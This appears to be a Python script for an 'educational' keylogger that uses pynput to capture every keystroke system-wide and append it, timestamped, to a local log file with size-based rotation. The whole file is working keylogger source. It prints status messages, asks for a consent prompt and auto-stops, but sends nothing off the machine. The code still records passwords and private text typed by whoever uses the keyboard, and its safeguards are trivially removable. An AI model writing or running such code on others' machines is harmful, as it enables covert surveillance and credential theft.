import pynput
from pynput import keyboard
import threading
import time
from datetime import datetime
import json
import os

class AdvancedEducationalKeylogger:
    def __init__(self, config_file="keylogger_config.json"):
        self.config = self.load_config(config_file)
        self.log_file = self.config["log_file"]
        self.current_log = ""
        self.key_count = 0
        self.session_data = {
            "start_time": datetime.now().isoformat(),
            "total_keys": 0,
            "session_duration": 0
        }
        
        self.setup_logging()
    
    def load_config(self, config_file):
        """Load configuration from JSON file"""
        default_config = {
            "log_file": "input.txt",
            "max_file_size": 5000,
            "auto_stop_minutes": 60,
            "log_timestamps": True
        }
        
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        
        return default_config
    
    def setup_logging(self):
        """Setup initial logging environment"""
        print("Educational Keylogger - Cybersecurity Learning Tool")
        print("Configured settings:")
        print(f"  Log file: {self.log_file}")
        print(f"  Max size: {self.config['max_file_size']} bytes")
        print(f"  Auto-stop: {self.config['auto_stop_minutes']} minutes")
        print("\nPress ESC to stop logging immediately")
    
    def on_press(self, key):
        try:
            self.key_count += 1
            
            # Log regular characters
            if hasattr(key, 'char') and key.char is not None:
                self.current_log += key.char
            else:
                # Handle special keys
                key_map = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n[ENTER]\n',
                    keyboard.Key.tab: '[TAB]',
                    keyboard.Key.backspace: '[BS]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.ctrl_l: '[CTRL]',
                    keyboard.Key.alt_l: '[ALT]'
                }
                self.current_log += key_map.get(key, f'[{key.name.upper()}]')
            
            # Periodic writing to file
            if len(self.current_log) >= 50 or self.key_count % 20 == 0:
                self.write_to_file()
                
        except Exception as e:
            print(f"Logging error: {e}")
    
    def write_to_file(self):
        """Write accumulated keystrokes to file with timestamp"""
        if not self.current_log.strip():
            return
            
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_entry = f"[{timestamp}] {self.current_log}"
            
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
            self.current_log = ""
            self.check_file_limits()
            
        except Exception as e:
            print(f"File write error: {e}")
    
    def check_file_limits(self):
        """Check and manage file size limits"""
        try:
            if os.path.exists(self.log_file):
                size = os.path.getsize(self.log_file)
                if size > self.config['max_file_size']:
                    # Create backup and start new log
                    backup_name = f"backup_{int(time.time())}.txt"
                    os.rename(self.log_file, backup_name)
                    print(f"Log file backed up as {backup_name}")
                    
                    with open(self.log_file, "w") as f:
                        f.write(f"New log started at {datetime.now()}\n")
        except Exception as e:
            print(f"File management error: {e}")
    
    def start_logging(self):
        """Main logging function"""
        # Initial log entry
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Session started: {datetime.now()}\n")
            f.write(f"{'='*50}\n\n")
        
        print("Keylogger active...")
        
        # Start keyboard listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            # Auto-stop timer
            stop_timer = threading.Timer(
                self.config['auto_stop_minutes'] * 60, 
                lambda: listener.stop()
            )
            stop_timer.start()
            
            try:
                listener.join()
            finally:
                stop_timer.cancel()
        
        # Final cleanup
        self.write_to_file()
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"\nSession ended: {datetime.now()}\n")
            f.write(f"Total keys logged: {self.key_count}\n")
        
        print(f"\nLogging complete. Total keys: {self.key_count}")

# Simple usage
if __name__ == "__main__":
    # Important educational disclaimer
    print("EDUCATIONAL USE ONLY")
    print("This demonstrates keylogger functionality for cybersecurity learning.")
    print("Only use on systems you own or have explicit permission to test.\n")
    
    consent = input("Do you understand and accept responsibility? (y/n): ")
    
    if consent.lower() in ['y', 'yes']:
        keylogger = AdvancedEducationalKeylogger()
        keylogger.start_logging()
    else:
        print("Program terminated. Only use with proper authorization.")